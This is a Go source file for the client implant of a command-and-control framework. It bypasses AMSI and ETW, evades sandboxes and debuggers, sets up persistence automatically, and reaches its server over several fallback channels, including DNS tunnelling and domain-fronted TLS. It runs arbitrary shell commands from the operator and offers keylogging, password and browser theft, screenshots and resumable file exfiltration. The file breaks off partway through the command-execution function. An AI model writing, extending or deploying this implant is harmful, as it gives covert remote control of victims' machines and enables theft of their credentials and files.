package agent

import (
	"crypto/hmac"
	"crypto/rand"
	"crypto/sha256"
	"crypto/tls"
	"encoding/base64"
	"encoding/binary"
	"encoding/json"
	"fmt"
	"io"
	"log"
	"net"
	"os"
	"os/exec"
	"os/user"
	"path/filepath"
	"runtime"
	"strings"
	"sync"
	"time"

	"github.com/Ruby570bocadito/WorldC2/src/go/internal/crypto"
	"github.com/Ruby570bocadito/WorldC2/src/go/internal/evasion"
	proto "github.com/Ruby570bocadito/WorldC2/src/go/internal/proto"
	"github.com/Ruby570bocadito/WorldC2/src/go/internal/transport"
	protobuf "google.golang.org/protobuf/proto"
)

// Agent is the client-side implant.
type Agent struct {
	serverAddr string
	agentID    string
	agentVer   string

	conn net.Conn

	// Crypto
	kp           *crypto.KeyPair
	encKey       []byte
	hmacKey      []byte
	sessionToken []byte
	serverPub    [crypto.KeySize]byte

	// State
	running        bool
	seqRx          uint32
	seqTx          uint32
	backoffBase    time.Duration
	backoffCurrent time.Duration
	backoffMax     time.Duration

	// Tunnels (SOCKS5 / PortFwd relay)
	tunnels   map[string]net.Conn
	tunnelsMu sync.Mutex
	writeMu   sync.Mutex

	// Modules
	modules    *ModuleRegistry
	dynModules map[string]*DynamicModule

	// Evasion
	evasive    bool
	jitterBase time.Duration
	sleepMask  *evasion.SleepMask

	// Certificate pinning
	certPinner *CertPinner

	// Optional mTLS client certificate (provisioned via /api/mtls/client-cert)
	clientCert *tls.Certificate

	// File exfiltration registry: transferID -> pending job (for resume)
	exfilJobs map[string]*exfilJob
	exfilMu   sync.Mutex

	// Optional DNS transport domain (opt-in via -dns-domain)
	dnsDomain string

	// Channels
	tasks   chan *proto.Task
	results chan *proto.TaskResult
}

// New creates a new agent.
func New(serverAddr string) *Agent {
	return &Agent{
		serverAddr:     serverAddr,
		agentID:        generateAgentID(),
		agentVer:       "2.0.0",
		backoffBase:    1 * time.Second,
		backoffCurrent: 1 * time.Second,
		backoffMax:     5 * time.Minute,
		evasive:        false,
		jitterBase:     5 * time.Second,
		sleepMask:      evasion.NewSleepMask(),
		tunnels:        make(map[string]net.Conn),
		modules:        NewModuleRegistry(),
		dynModules:     make(map[string]*DynamicModule),
		exfilJobs:      make(map[string]*exfilJob),
		tasks:          make(chan *proto.Task, 256),
		results:        make(chan *proto.TaskResult, 256),
	}
}

// SetDNSDomain enables the DNS transport fallback for the given domain.
// The server must be listening with the same domain in transport.dns_domains.
func (a *Agent) SetDNSDomain(domain string) { a.dnsDomain = domain }

// Run starts the agent main loop with reconnection.
func (a *Agent) Run() error {
	a.running = true

	// === EVASION: Initialize at startup ===
	// Windows: AMSI bypass, ETW bypass, ntdll unhook, anti-sandbox, anti-debug
	// Linux/macOS: Anti-sandbox, anti-debug checks
	log.Printf("[AGENT] Initializing evasion techniques...")
	evasion.Init()

	// Auto-persist on first run (if not already persisted)
	if !a.isPersisted() {
		log.Printf("[AGENT] First run — establishing persistence")
		a.autoPersist()
	}

	for a.running {
		log.Printf("[AGENT] Connecting to %s...", a.serverAddr)

		if err := a.connect(); err != nil {
			log.Printf("[AGENT] Connection failed: %v", err)
			a.waitBackoff()
			continue
		}

		a.backoffCurrent = a.backoffBase

		if err := a.performKeyExchange(); err != nil {
			log.Printf("[AGENT] Key exchange failed: %v", err)
			a.conn.Close()
			a.waitBackoff()
			continue
		}

		if err := a.sendSessionInit(); err != nil {
			log.Printf("[AGENT] Session init failed: %v", err)
			a.conn.Close()
			a.waitBackoff()
			continue
		}

		log.Printf("[AGENT] Session established with %s", a.serverAddr)

		// Per-connection lifecycle: the helper loops below exit when
		// connDone is closed. Before this fix every reconnect leaked the
		// previous generation of goroutines (they ranged over the shared
		// channels forever and wrote through the new connection).
		connDone := make(chan struct{})
		go a.heartbeatLoop(connDone)
		go a.taskProcessor(connDone)
		go a.resultSender(connDone)

		// Message loop (blocks until disconnect)
		err := a.messageLoop()

		a.conn.Close()
		close(connDone)

		if err != nil {
			log.Printf("[AGENT] Connection lost: %v", err)
			// Check if this was a kill command
			if !a.running {
				break
			}
		}

		// Reconnect with backoff
		a.waitBackoff()
	}

	log.Printf("[AGENT] Agent exited")
	return nil
}

// Stop signals the agent to stop.
func (a *Agent) Stop() {
	a.running = false
	if a.conn != nil {
		a.conn.Close()
	}
}

func (a *Agent) waitBackoff() {
	if !a.running {
		return
	}
	jitterBytes := make([]byte, 8)
	rand.Read(jitterBytes)
	jitterFactor := float64(binary.BigEndian.Uint64(jitterBytes)%1000) / 1000.0
	jitter := time.Duration(float64(a.backoffCurrent) * 0.3 * jitterFactor)
	wait := a.backoffCurrent + jitter
	log.Printf("[AGENT] Reconnecting in %v...", wait.Round(time.Millisecond))

	// === EVASION: Sleep mask — encrypt memory during idle ===
	if a.sleepMask != nil {
		a.sleepMask.ObfuscatedSleep(wait)
	} else {
		time.Sleep(wait)
	}

	backoffJitterBytes := make([]byte, 8)
	rand.Read(backoffJitterBytes)
	backoffJitter := time.Duration(binary.BigEndian.Uint64(backoffJitterBytes) % uint64(a.backoffCurrent))
	a.backoffCurrent = minDuration(a.backoffCurrent*2+backoffJitter, a.backoffMax)
}

// SetClientCert attaches an optional mTLS client certificate used on every
// TLS dial (provisioned with POST /api/mtls/client-cert when the server
// enforces tls.mtls).
func (a *Agent) SetClientCert(cert tls.Certificate) { a.clientCert = &cert }

func (a *Agent) connect() error {
	host, port, _ := net.SplitHostPort(a.serverAddr)
	if host == "" {
		host = a.serverAddr
		port = "8443"
	}

	// Transport fallback: TLS (cert-pinned) → TCP → HTTP → WebSocket → DNS
	transports := []struct {
		name string
		dial func() (net.Conn, error)
	}{
		{
			name: "TLS",
			dial: func() (net.Conn, error) {
				// Use certificate pinning if available
				if a.certPinner != nil {
					conn, err := a.certPinner.DialTLS(net.JoinHostPort(host, port))
					if err == nil {
						// Store fingerprint on first successful connection
						state := conn.(*tls.Conn).ConnectionState()
						if len(state.PeerCertificates) > 0 {
							fp := GetFingerprintFromCert(state.PeerCertificates[0])
							if a.certPinner.pinnedFingerprint == "" {
								a.certPinner.pinnedFingerprint = fp
								log.Printf("[AGENT] Pinned server certificate: %s", fp[:16]+"...")
							}
						}
					}
					return conn, err
				}

				// First connection: accept any cert but prepare to pin
				tlsConfig := &tls.Config{
					InsecureSkipVerify: true,
					MinVersion:         tls.VersionTLS12,
					ServerName:         host,
				}
				if a.clientCert != nil {
					tlsConfig.Certificates = []tls.Certificate{*a.clientCert}
				}
				dialer := &net.Dialer{Timeout: 10 * time.Second}
				conn, err := tls.DialWithDialer(dialer, "tcp", net.JoinHostPort(host, port), tlsConfig)
				if err == nil {
					// Extract and pin the certificate fingerprint
					state := conn.ConnectionState()
					if len(state.PeerCertificates) > 0 {
						fp := GetFingerprintFromCert(state.PeerCertificates[0])
						a.certPinner = NewCertPinner(fp, host)
						if a.clientCert != nil {
							a.certPinner.SetClientCert(*a.clientCert)
						}
						log.Printf("[AGENT] Pinned server certificate on first connect: %s", fp[:16]+"...")
					}
				}
				return conn, err
			},
		},
		{
			name: "TCP",
			dial: func() (net.Conn, error) {
				return net.DialTimeout("tcp", a.serverAddr, 10*time.Second)
			},
		},
		{
			name: "HTTP",
			dial: func() (net.Conn, error) {
				httpPort := "8445"
				return net.DialTimeout("tcp", net.JoinHostPort(host, httpPort), 10*time.Second)
			},
		},
		{
			name: "WebSocket",
			dial: func() (net.Conn, error) {
				wsPort := "8446"
				return dialWebSocket(host, wsPort, a.clientCert)
			},
		},
		{
			name: "WebRTC",
			dial: func() (net.Conn, error) {
				webrtcPort := "8447"
				addr := net.JoinHostPort(host, webrtcPort)
				// The server serves signaling over TLS whenever tls.enabled
				// (independent of mTLS). Try HTTPS first, then plaintext, so
				// the transport works in both postures.
				conn, err := transport.DialWebRTC(addr, true)
				if err == nil {
					return conn, nil
				}
				return transport.DialWebRTC(addr, false)
			},
		},
		{
			name: "DNS",
			dial: func() (net.Conn, error) {
				if a.dnsDomain == "" {
					return nil, fmt.Errorf("DNS transport disabled (start the agent with -dns-domain <domain>)")
				}
				dnsPort := "8444"
				return dialDNS(net.JoinHostPort(host, dnsPort), a.dnsDomain)
			},
		},
	}

	for _, t := range transports {
		conn, err := t.dial()
		if err == nil {
			log.Printf("[AGENT] Connected via %s to %s", t.name, a.serverAddr)
			a.conn = conn
			return nil
		}
		log.Printf("[AGENT] %s transport failed: %v", t.name, err)
	}

	return fmt.Errorf("all transports failed")
}

// ConnectCamouflaged connects using traffic camouflage (domain fronting, HTTP preamble).
func (a *Agent) ConnectCamouflaged() error {
	host, port, _ := net.SplitHostPort(a.serverAddr)
	if host == "" {
		host = a.serverAddr
		port = "8443"
	}

	cfg := evasion.DefaultCamouflage()
	cfg.SNI = host
	cfg.DomainFront = host

	dialer := evasion.NewCamouflagedDialer(cfg)
	conn, err := dialer.Dial(net.JoinHostPort(host, port))
	if err != nil {
		return err
	}

	log.Printf("[AGENT] Connected via camouflaged TLS to %s", a.serverAddr)
	a.conn = conn
	return nil
}

// --- WebSocket Transport ---

// wsConn wraps an HTTP connection with WebSocket framing.
type wsConn struct {
	conn   net.Conn
	reader *wsFrameReader
	writer *wsFrameWriter
}

type wsFrameReader struct {
	conn   net.Conn
	buf    []byte
	offset int
	length int
}

type wsFrameWriter struct {
	conn net.Conn
}

func (r *wsFrameReader) Read(b []byte) (int, error) {
	for r.offset >= r.length {
		// Read frame header (2 bytes minimum). io.ReadFull is required:
		// TCP fragmentation routinely splits these small reads.
		header := make([]byte, 2)
		if _, err := io.ReadFull(r.conn, header); err != nil {
			return 0, err
		}

		// Check for close frame
		opcode := header[0] & 0x0F
		if opcode == 0x08 {
			return 0, fmt.Errorf("websocket closed")
		}

		masked := (header[1] & 0x80) != 0
		payloadLen := int(header[1] & 0x7F)

		if payloadLen == 126 {
			ext := make([]byte, 2)
			if _, err := io.ReadFull(r.conn, ext); err != nil {
				return 0, err
			}
			payloadLen = int(ext[0])<<8 | int(ext[1])
		} else if payloadLen == 127 {
			ext := make([]byte, 8)
			if _, err := io.ReadFull(r.conn, ext); err != nil {
				return 0, err
			}
			payloadLen = int(ext[4])<<24 | int(ext[5])<<16 | int(ext[6])<<8 | int(ext[7])
		}

		// Read mask key if present
		var maskKey [4]byte
		if masked {
			if _, err := io.ReadFull(r.conn, maskKey[:]); err != nil {
				return 0, err
			}
		}

		// Read payload
		r.buf = make([]byte, payloadLen)
		if payloadLen > 0 {
			if _, err := io.ReadFull(r.conn, r.buf); err != nil {
				return 0, err
			}
		}

		// Unmask if needed
		if masked {
			for i := 0; i < len(r.buf); i++ {
				r.buf[i] ^= maskKey[i%4]
			}
		}

		r.offset = 0
		r.length = len(r.buf)
	}

	n := copy(b, r.buf[r.offset:r.length])
	r.offset += n
	return n, nil
}

func (w *wsFrameWriter) Write(b []byte) (int, error) {
	// RFC 6455: all client-to-server frames MUST be masked.
	var maskKey [4]byte
	if _, err := rand.Read(maskKey[:]); err != nil {
		return 0, fmt.Errorf("generate ws mask: %w", err)
	}

	frame := make([]byte, 0, 14+len(b))
	frame = append(frame, 0x82) // FIN + binary opcode

	if len(b) < 126 {
		frame = append(frame, 0x80|byte(len(b))) // MASK bit set
	} else if len(b) < 65536 {
		frame = append(frame, 0x80|126, byte(len(b)>>8), byte(len(b)))
	} else {
		frame = append(frame, 0x80|127)
		for i := 7; i >= 0; i-- {
			frame = append(frame, byte(len(b)>>(i*8)))
		}
	}
	frame = append(frame, maskKey[:]...)

	// Append the masked payload
	for i := 0; i < len(b); i++ {
		frame = append(frame, b[i]^maskKey[i%4])
	}
	return w.conn.Write(frame)
}

func (c *wsConn) Read(b []byte) (int, error)  { return c.reader.Read(b) }
func (c *wsConn) Write(b []byte) (int, error) { return c.writer.Write(b) }
func (c *wsConn) Close() error                { return c.conn.Close() }
func (c *wsConn) LocalAddr() net.Addr         { return c.conn.LocalAddr() }
func (c *wsConn) RemoteAddr() net.Addr        { return c.conn.RemoteAddr() }
func (c *wsConn) SetDeadline(t time.Time) error {
	return c.conn.SetDeadline(t)
}
func (c *wsConn) SetReadDeadline(t time.Time) error {
	return c.conn.SetReadDeadline(t)
}
func (c *wsConn) SetWriteDeadline(t time.Time) error {
	return c.conn.SetWriteDeadline(t)
}

// dialWebSocket establishes a WebSocket connection to the server.
func dialWebSocket(host, port string, clientCert *tls.Certificate) (net.Conn, error) {
	addr := net.JoinHostPort(host, port)
	wsTLSConfig := &tls.Config{
		InsecureSkipVerify: true,
		MinVersion:         tls.VersionTLS12,
		ServerName:         host,
	}
	if clientCert != nil {
		wsTLSConfig.Certificates = []tls.Certificate{*clientCert}
	}
	conn, err := tls.DialWithDialer(&net.Dialer{Timeout: 10 * time.Second}, "tcp", addr, wsTLSConfig)
	if err != nil {
		return nil, err
	}

	// Send WebSocket upgrade request
	key := make([]byte, 16)
	rand.Read(key)
	keyBase64 := base64.StdEncoding.EncodeToString(key)

	upgradeReq := fmt.Sprintf(
		"GET /ws HTTP/1.1\r\n"+
			"Host: %s\r\n"+
			"Upgrade: websocket\r\n"+
			"Connection: Upgrade\r\n"+
			"Sec-WebSocket-Key: %s\r\n"+
			"Sec-WebSocket-Version: 13\r\n"+
			"Sec-WebSocket-Protocol: worldc2-c2\r\n\r\n",
		addr, keyBase64)

	if _, err := conn.Write([]byte(upgradeReq)); err != nil {
		conn.Close()
		return nil, err
	}

	// Read response
	buf := make([]byte, 1024)
	n, err := conn.Read(buf)
	if err != nil {
		conn.Close()
		return nil, err
	}

	resp := string(buf[:n])
	if !strings.Contains(resp, "101 Switching Protocols") {
		conn.Close()
		return nil, fmt.Errorf("websocket upgrade failed: %s", resp[:minInt(len(resp), 100)])
	}

	return &wsConn{
		conn:   conn,
		reader: &wsFrameReader{conn: conn},
		writer: &wsFrameWriter{conn: conn},
	}, nil
}

// --- DNS Transport ---

// dnsConn implements net.Conn for DNS tunneling.
//
// A dedicated reader goroutine consumes every UDP answer so downlink data
// piggybacking on the responses to UPSTREAM data queries is never lost (each
// response drains one entry of the server's down-queue; if only the idle
// polls consumed them, a large upload would silently swallow queued
// downstream bytes and corrupt the C2 stream). Read() polls with empty
// queries when there is nothing queued and tolerates long idle periods —
// the server sends nothing spontaneously, so a short poll window would tear
// down and reconnect the session every couple of seconds.
type dnsConn struct {
	conn      *net.UDPConn
	server    *net.UDPAddr
	domain    string
	sessionID string

	mu      sync.Mutex
	downBuf []byte // received downlink bytes not yet handed to Read
	downOff int    // consumed prefix of downBuf

	gotData   chan struct{} // buffered(1): downlink data became available
	closed    chan struct{}
	closeOnce sync.Once
}

const (
	dnsPollInterval = 250 * time.Millisecond
	dnsIdleWindow   = 5 * time.Minute // same idle bound as the server side
)

// readLoop consumes UDP answers until the socket is closed.
func (c *dnsConn) readLoop() {
	defer c.shutdown()
	resp := make([]byte, 65535) // TXT answers can exceed the classic 512B UDP size
	for {
		n, _, err := c.conn.ReadFromUDP(resp)
		if err != nil {
			return
		}
		data := extractDNSTXTData(resp[:n])
		if len(data) == 0 {
			continue
		}
		c.mu.Lock()
		if c.downOff > 0 {
			c.downBuf = append([]byte(nil), c.downBuf[c.downOff:]...)
			c.downOff = 0
		}
		c.downBuf = append(c.downBuf, data...)
		c.mu.Unlock()
		select {
		case c.gotData <- struct{}{}:
		default:
		}
	}
}

func (c *dnsConn) shutdown() {
	c.closeOnce.Do(func() {
		close(c.closed)
		c.conn.Close()
	})
}

func (c *dnsConn) Read(b []byte) (int, error) {
	deadline := time.Now().Add(dnsIdleWindow)
	for {
		c.mu.Lock()
		if c.downOff < len(c.downBuf) {
			n := copy(b, c.downBuf[c.downOff:])
			c.downOff += n
			c.mu.Unlock()
			return n, nil
		}
		c.mu.Unlock()

		// Nothing queued: send an empty poll query. The answer (and any
		// downlink data queued just after it) is consumed by readLoop.
		if _, err := c.conn.Write(buildDNSQuery(c.sessionID, c.domain, []byte{})); err != nil {
			return 0, err
		}

		select {
		case <-c.closed:
			return 0, fmt.Errorf("dns connection closed")
		case <-c.gotData:
			// Data appended by readLoop — retry the copy above.
		case <-time.After(dnsPollInterval):
			if time.Now().After(deadline) {
				return 0, fmt.Errorf("dns read timeout (no downstream data for %v)", dnsIdleWindow)
			}
		}
	}
}

func (c *dnsConn) Write(b []byte) (int, error) {
	// The query name caps how much data fits in one DNS packet; larger
	// writes are split into sequenced queries (the C2 framing reads them
	// back in order).
	maxPayload := maxDNSPayload(len(c.domain))
	if maxPayload < 32 {
		maxPayload = 32
	}
	total := 0
	for total < len(b) {
		end := total + maxPayload
		if end > len(b) {
			end = len(b)
		}
		query := buildDNSQuery(c.sessionID, c.domain, b[total:end])
		if _, err := c.conn.Write(query); err != nil {
			return total, err
		}
		total = end
	}
	return total, nil
}

func (c *dnsConn) Close() error {
	c.shutdown()
	return nil
}
func (c *dnsConn) LocalAddr() net.Addr {
	return &net.UDPAddr{IP: net.IPv4zero, Port: 0}
}
func (c *dnsConn) RemoteAddr() net.Addr { return c.server }

// Deadlines: the socket belongs to the reader goroutine, so per-op deadlines
// cannot be honoured by Read/Write directly. The poll loop above provides the
// idle bound instead.
func (c *dnsConn) SetDeadline(t time.Time) error      { return nil }
func (c *dnsConn) SetReadDeadline(t time.Time) error  { return nil }
func (c *dnsConn) SetWriteDeadline(t time.Time) error { return nil }

// maxDNSDomainLen caps the tunnel domain so the shortest possible query
// (session label + one payload label + domain) still fits in a DNS name
// instead of silently producing a corrupt wire name.
const maxDNSDomainLen = dnsNameLimit - 11

// dialDNS establishes a DNS tunnel connection.
func dialDNS(serverAddr, domain string) (net.Conn, error) {
	if domain == "" {
		return nil, fmt.Errorf("dns tunnel: empty domain")
	}
	if len(domain) > maxDNSDomainLen {
		return nil, fmt.Errorf("dns tunnel: domain too long (%d chars, max %d)", len(domain), maxDNSDomainLen)
	}

	server, err := net.ResolveUDPAddr("udp", serverAddr)
	if err != nil {
		return nil, err
	}

	conn, err := net.DialUDP("udp", nil, server)
	if err != nil {
		return nil, err
	}

	sessionID := fmt.Sprintf("%x", sha256.Sum256([]byte(time.Now().String())))[:16]

	c := &dnsConn{
		conn:      conn,
		server:    server,
		domain:    domain,
		sessionID: sessionID,
		gotData:   make(chan struct{}, 1),
		closed:    make(chan struct{}),
	}
	go c.readLoop()
	return c, nil
}

const (
	dnsLabelMax  = 48  // payload label size: multiple of 4 so base64 groups never straddle labels (< 63)
	dnsNameLimit = 253 // RFC 1035 max wire length of a domain name
)

// maxDNSPayload computes how many payload bytes fit in one query name:
// "<sess8>.<l1>.<l2>...<domain>." must stay under dnsNameLimit.
func maxDNSPayload(domainLen int) int {
	// Overhead: sess label (8+1) + domain (len+1) + terminating zero
	available := dnsNameLimit - 9 - domainLen - 2
	labels := available / (dnsLabelMax + 1)
	if labels < 1 {
		labels = 1
	}
	// RawURL base64 encodes 3 bytes into 4 chars.
	return labels * dnsLabelMax / 4 * 3
}

func buildDNSQuery(sessionID, domain string, data []byte) []byte {
	// Encode data as unpadded URL-safe base64 split across labels.
	encoded := base64.RawURLEncoding.EncodeToString(data)

	var sb strings.Builder
	sb.WriteString(sessionID[:8])
	for i := 0; i < len(encoded); i += dnsLabelMax {
		end := i + dnsLabelMax
		if end > len(encoded) {
			end = len(encoded)
		}
		sb.WriteByte('.')
		sb.WriteString(encoded[i:end])
	}
	sb.WriteByte('.')
	sb.WriteString(domain)
	qname := sb.String()

	// Build DNS query header
	buf := make([]byte, 0, 64+len(qname))
	buf = append(buf, 0x00, 0x01) // Transaction ID
	buf = append(buf, 0x01, 0x00) // Flags: standard query
	buf = append(buf, 0x00, 0x01) // Questions: 1
	buf = append(buf, 0x00, 0x00) // Answer RRs: 0
	buf = append(buf, 0x00, 0x00) // Authority RRs: 0
	buf = append(buf, 0x00, 0x00) // Additional RRs: 0

	// Encode question name
	for _, label := range strings.Split(qname, ".") {
		if label == "" {
			continue
		}
		buf = append(buf, byte(len(label)))
		buf = append(buf, label...)
	}
	buf = append(buf, 0x00) // End of name

	// QTYPE: TXT (16), QCLASS: IN (1)
	buf = append(buf, 0x00, 0x10)
	buf = append(buf, 0x00, 0x01)

	return buf
}

func extractDNSTXTData(resp []byte) []byte {
	if len(resp) < 12 {
		return nil
	}

	// Skip header + question
	offset := 12
	for offset < len(resp) {
		if resp[offset] == 0 {
			offset++
			break
		}
		offset += int(resp[offset]) + 1
	}
	offset += 4 // QTYPE + QCLASS

	// Skip to answer section
	ansCount := int(resp[6])<<8 | int(resp[7])
	if ansCount == 0 {
		return nil
	}

	// Parse first answer (TXT record)
	for offset < len(resp)-10 {
		// Skip name
		if resp[offset] == 0 {
			offset++
		} else if resp[offset]&0xC0 == 0xC0 {
			offset += 2
		} else {
			offset += int(resp[offset]) + 1
		}

		if offset+10 > len(resp) {
			break
		}

		rtype := int(resp[offset])<<8 | int(resp[offset+1])
		rdlength := int(resp[offset+8])<<8 | int(resp[offset+9])

		if rtype == 16 && offset+10+rdlength <= len(resp) { // TXT
			// TXT data: sequence of <len-byte><string> character-strings.
			txtData := resp[offset+10 : offset+10+rdlength]
			var out []byte
			for pos := 0; pos < len(txtData); {
				l := int(txtData[pos])
				pos++
				if pos+l > len(txtData) {
					break
				}
				out = append(out, txtData[pos:pos+l]...)
				pos += l
			}
			return out
		}

		offset += 10 + rdlength
	}

	return nil
}

func minInt(a, b int) int {
	if a < b {
		return a
	}
	return b
}

func (a *Agent) performKeyExchange() error {
	kp, err := crypto.GenerateKeyPair()
	if err != nil {
		return fmt.Errorf("generate key pair: %w", err)
	}
	a.kp = kp

	agentKE := &proto.KeyExchange{
		PublicKey:    kp.PublicKey[:],
		AgentVersion: a.agentVer,
		Transports:   []string{"tcp"},
	}

	rawInner := &proto.EnvelopeInner{
		Id:        1,
		Type:      proto.EnvelopeType_ENVELOPE_TYPE_KEY_EXCHANGE,
		Timestamp: uint64(time.Now().UnixNano()),
		Payload:   &proto.EnvelopeInner_KeyExchange{KeyExchange: agentKE},
	}

	innerBytes, _ := protobuf.Marshal(rawInner)
	env := &proto.Envelope{
		Id:         1,
		Type:       proto.EnvelopeType_ENVELOPE_TYPE_KEY_EXCHANGE,
		Timestamp:  rawInner.Timestamp,
		Nonce:      make([]byte, crypto.NonceSize),
		Ciphertext: innerBytes,
	}

	if err := a.sendRaw(env); err != nil {
		return fmt.Errorf("send key exchange: %w", err)
	}

	// Receive server key exchange (raw)
	envData, err := a.recvBytes()
	if err != nil {
		return fmt.Errorf("recv server key exchange: %w", err)
	}

	serverEnv := &proto.Envelope{}
	if err := protobuf.Unmarshal(envData, serverEnv); err != nil {
		return fmt.Errorf("unmarshal: %w", err)
	}

	serverInner := &proto.EnvelopeInner{}
	if err := protobuf.Unmarshal(serverEnv.Ciphertext, serverInner); err != nil {
		return fmt.Errorf("unmarshal inner: %w", err)
	}

	serverKE := serverInner.GetKeyExchange()
	if len(serverKE.PublicKey) != crypto.KeySize {
		return fmt.Errorf("invalid server public key size")
	}
	copy(a.serverPub[:], serverKE.PublicKey)

	sharedSecret, err := crypto.DeriveSharedSecret(&a.kp.PrivateKey, &a.serverPub)
	if err != nil {
		return fmt.Errorf("derive shared secret: %w", err)
	}

	salt := serverKE.Padding
	if len(salt) == 0 {
		salt = nil
	}

	encKey, hmacKey, sessionToken, err := crypto.DeriveSessionKeys(sharedSecret, salt)
	if err != nil {
		return fmt.Errorf("derive session keys: %w", err)
	}

	a.encKey = encKey
	a.hmacKey = hmacKey
	a.sessionToken = sessionToken
	return nil
}

func (a *Agent) sendSessionInit() error {
	hostname, _ := os.Hostname()
	currentUser, _ := user.Current()
	username := "unknown"
	if currentUser != nil {
		username = currentUser.Username
	}

	init := &proto.SessionInit{
		Hostname:     hostname,
		Os:           runtime.GOOS,
		Arch:         runtime.GOARCH,
		Username:     username,
		Pid:          uint32(os.Getpid()),
		IsAdmin:      isAdmin(),
		AgentId:      a.agentID,
		AgentVersion: a.agentVer,
	}

	rawInner := &proto.EnvelopeInner{
		Id:        3,
		Type:      proto.EnvelopeType_ENVELOPE_TYPE_SESSION_INIT,
		Timestamp: uint64(time.Now().UnixNano()),
		Payload:   &proto.EnvelopeInner_SessionInit{SessionInit: init},
	}

	innerBytes, _ := protobuf.Marshal(rawInner)
	env := &proto.Envelope{
		Id:         3,
		Type:       proto.EnvelopeType_ENVELOPE_TYPE_SESSION_INIT,
		Timestamp:  rawInner.Timestamp,
		Nonce:      make([]byte, crypto.NonceSize),
		Ciphertext: innerBytes,
	}

	return a.sendRaw(env)
}

func (a *Agent) messageLoop() error {
	// Read ACK first (encrypted from server)
	_, err := a.recvEnvelope()
	if err != nil {
		return fmt.Errorf("recv ack: %w", err)
	}

	for a.running {
		inner, err := a.recvEnvelope()
		if err != nil {
			return fmt.Errorf("recv: %w", err)
		}

		switch inner.Type {
		case proto.EnvelopeType_ENVELOPE_TYPE_TASK:
			task := inner.GetTask()
			if task != nil {
				switch task.Command {
				case "kill":
					log.Printf("[AGENT] Received kill command, shutting down")
					a.Stop()
					return nil

				case "passive":
					log.Printf("[AGENT] Entering passive mode")
					return nil

				default:
					select {
					case a.tasks <- task:
					default:
						log.Printf("[AGENT] Task queue full, dropping %s", task.TaskId)
					}
				}
			}

		case proto.EnvelopeType_ENVELOPE_TYPE_DISCONNECT:
			log.Printf("[AGENT] Server requested disconnect")
			a.Stop()
			return nil

		case proto.EnvelopeType_ENVELOPE_TYPE_HEARTBEAT:
			a.sendEncrypted(proto.EnvelopeType_ENVELOPE_TYPE_HEARTBEAT,
				&proto.Heartbeat{Timestamp: uint64(time.Now().UnixNano())})
		}
	}

	return nil
}

func (a *Agent) heartbeatLoop(done <-chan struct{}) {
	jitterBytes := make([]byte, 8)
	rand.Read(jitterBytes)
	jitterSec := 25 + int(binary.BigEndian.Uint64(jitterBytes)%10)
	ticker := time.NewTicker(time.Duration(jitterSec) * time.Second)
	defer ticker.Stop()

	for {
		select {
		case <-done:
			return
		case <-ticker.C:
			a.sendEncrypted(proto.EnvelopeType_ENVELOPE_TYPE_HEARTBEAT,
				&proto.Heartbeat{Timestamp: uint64(time.Now().UnixNano())})
		}
	}
}

func (a *Agent) taskProcessor(done <-chan struct{}) {
	for {
		select {
		case <-done:
			return
		case task, ok := <-a.tasks:
			if !ok {
				return
			}
			if !a.running {
				return
			}
			result := a.executeTask(task)
			a.sendEncrypted(proto.EnvelopeType_ENVELOPE_TYPE_TASK_RESULT, result)
		}
	}
}

func (a *Agent) resultSender(done <-chan struct{}) {
	for {
		select {
		case <-done:
			return
		case result, ok := <-a.results:
			if !ok {
				return
			}
			if !a.running {
				return
			}
			log.Printf("[AGENT] resultSender: sending %s", result.TaskId)
			a.sendEncrypted(proto.EnvelopeType_ENVELOPE_TYPE_TASK_RESULT, result)
		}
	}
}

func (a *Agent) executeTask(task *proto.Task) *proto.TaskResult {
	cmd := task.Command

	// Dynamic module loading
	if strings.HasPrefix(cmd, "module_load:") {
		return a.handleModuleLoad(cmd)
	}

	// File exfiltration (chunked, resumable)
	if strings.HasPrefix(cmd, "exfil:") {
		return a.handleExfilSend(task, strings.TrimPrefix(cmd, "exfil:"))
	}
	if strings.HasPrefix(cmd, "exfil_find:") {
		return a.handleExfilFind(task, strings.TrimPrefix(cmd, "exfil_find:"))
	}
	if strings.HasPrefix(cmd, "__exfil_resume ") {
		return a.handleExfilResume(task, strings.TrimPrefix(cmd, "__exfil_resume "))
	}

	// Dynamic module commands
	if dm := a.findDynamicModuleCommand(cmd); dm != nil {
		return dm(cmd)
	}

	// Module commands
	if m := a.modules.Get(cmd); m != nil {
		output := m.Execute("")
		return &proto.TaskResult{TaskId: task.TaskId, Output: output, Success: true}
	}
	// Module with args (e.g. "find:*.txt")
	if idx := strings.Index(cmd, ":"); idx > 0 {
		modName := cmd[:idx]
		arg := cmd[idx+1:]
		if m := a.modules.Get(modName); m != nil {
			output := m.Execute(arg)
			return &proto.TaskResult{TaskId: task.TaskId, Output: output, Success: true}
		}
	}
	// List modules
	if cmd == "modules" {
		list := a.modules.List()
		return &proto.TaskResult{
			TaskId:  task.TaskId,
			Output:  fmt.Sprintf("Available modules: %v\n\nUse: keylogger, screenshot, persistence, ps, sysinfo, netinfo, find:pattern, clipboard, passhunt, browser, watch:interval, migrate:pid\nExfiltration: exfil:<path> (file or dir, resumable), exfil_find:<root>|<pattern>", list),
			Success: true,
		}
	}

	// Tunnel commands
	if strings.HasPrefix(cmd, "tunnel_open:") {
		return a.handleTunnelOpen(cmd)
	}
	if strings.HasPrefix(cmd, "tunnel_data:") {
		return a.handleTunnelData(cmd)
	}
	if strings.HasPrefix(cmd, "tunnel_close:") {
		return a.handleTunnelClose(cmd)
	}

	// SOCKS connect (legacy format)
	if strings.HasPrefix(cmd, "socks:") {
		return a.handleTunnelOpen("tunnel_open:socks:" + cmd[6:])
	}

	// Built-in commands
	if cmd == "kill" {
		a.Stop()
		return &proto.TaskResult{TaskId: task.TaskId, Output: "terminating", Success: true}
	}

	log.Printf("[AGENT] Executing: %s", task.Command)

	timeout := time.Duration(task.TimeoutSec) * time.Second
	if timeout == 0 {
		timeout = 30 * time.Second
	}

	var output []byte
	var exitCode uint32
	var errMsg string

	var cmdObj *exec.Cmd
	if runtime.GOOS == "windows" {
		cmdObj = exec.Command("cmd", "/c", task.Command)
	} else {
		cmdObj = exec.Command("sh", "-c", task.Command)
	}

	done := make(chan struct{})
	var mu sync.Mutex
	go func() {
		defer close(done)
		out, err := cmdObj.CombinedOutput()
		mu.Lock()
		output = out
		if err != nil {
			if exitErr, ok := err.(*exec.ExitError); ok {
				exitCode = uint32(exitErr.ExitCode())
			} else {
				exitCode = 1
			}
			errMsg = err.Error()
		}
		mu.Unlock()
	}()

	timer := time.AfterFunc(timeout, func() {
		if cmdObj.Process != nil {
			cmdObj.Process.Kill()
		}
	})

	select {
	case <-done:
		timer.Stop()
